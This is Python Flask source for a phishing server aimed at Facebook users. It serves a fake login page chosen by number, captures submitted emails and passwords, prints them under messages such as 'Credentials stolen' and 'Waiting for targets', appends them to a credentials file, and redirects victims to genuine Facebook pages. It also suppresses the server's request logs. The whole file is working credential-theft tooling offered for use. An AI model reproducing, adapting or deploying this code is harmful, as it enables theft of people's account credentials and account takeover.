from flask import Flask, render_template, request, redirect
import logging, socket

app = Flask(__name__, template_folder='./')

@app.route('/')
def home():
    ip = ''
    print("\n Target captured...")
    print(f" IP: {ip}")
    return render_template(f'{page}.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('user')
    password = request.form.get('pwd')
    print(email)
    if email and password:
        print(" ✔️ Credentials stolen...")
        print(f'-> Email: {email}\n-> Password: {password}')
        save_credentials(email, password)
        print('Credentials saved at credentials.txt\n')
        return redirect('https://viewpoints.fb.com/')
    return redirect('https://www.facebook.com/recover')

def get_local_ip():
    try:
        # Create a socket and connect to a remote server
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except socket.error:
        return '127.0.0.1'  # Return localhost IP if unable to retrieve

def print_ips():
    # Get the local IP address
    local_ip = get_local_ip()
    print(" [testing] Localhost:", local_ip)

    # Get the public IP address
    public_ip = socket.gethostbyname(socket.getfqdn())
    public_link = f"http://{public_ip}"
    print(" [distribution] Public Link:", public_link)

    # Get the server IP address
    server_ip = get_local_ip()
    server_link = f"http://{server_ip}:8080"
    print(" [Server] Server Link:", server_link)

    print(" Development server started...\n")
    print(" Waiting for targets...\n")

def save_credentials(email, password):
    with open('../credentials.txt', 'a') as file:
        file.write(f'Email: {email}\n')
        file.write(f'Password: {password}\n')
        file.write(f'Phishing Page Number: {page}\n')
        file.write('---------------------\n')

if __name__ == '__main__':
    app.logger.disabled = True
    alog = logging.getLogger('werkzeug')
    alog.setLevel(logging.ERROR)
    page = input("Enter page number: ")
    print_ips()
    app.run(host='0.0.0.0', port=8080)
